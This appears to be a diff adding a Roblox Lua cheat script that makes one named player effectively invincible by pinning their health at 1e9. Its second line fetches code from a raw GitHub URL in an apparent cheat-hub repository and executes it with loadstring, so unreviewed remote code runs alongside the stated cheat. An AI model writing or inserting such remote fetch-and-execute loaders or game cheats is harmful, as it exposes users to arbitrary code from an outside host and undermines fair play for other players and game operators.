@@ -1,0 +1,33 @@
+print("loading...")
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()
+local targetPlayerName = "plshelpme8312"
+local invincibleHealth = 1e9 -- A very high health value to simulate invincibility
+
+local function makeInvulnerable(player)
+    local function onCharacterAdded(character)
+        local humanoid = character:WaitForChild("Humanoid")
+        humanoid.Health = invincibleHealth -- Set initial high health
+
+        -- Prevent health from changing by immediately setting it back to a high value
+        humanoid:GetPropertyChangedSignal("Health"):Connect(function()
+            if humanoid.Health < invincibleHealth then
+                humanoid.Health = invincibleHealth
+            end
+        end)
+    end
+
+    if player.Name == targetPlayerName then
+        player.CharacterAdded:Connect(onCharacterAdded)
+
+        -- Apply immediately if the player already has a character when script runs
+        if player.Character then
+            onCharacterAdded(player.Character)
+        end
+    end
+end
+
+-- Connect all current and future players
+game.Players.PlayerAdded:Connect(makeInvulnerable)
+for _, player in ipairs(game.Players:GetPlayers()) do
+    makeInvulnerable(player)
+end
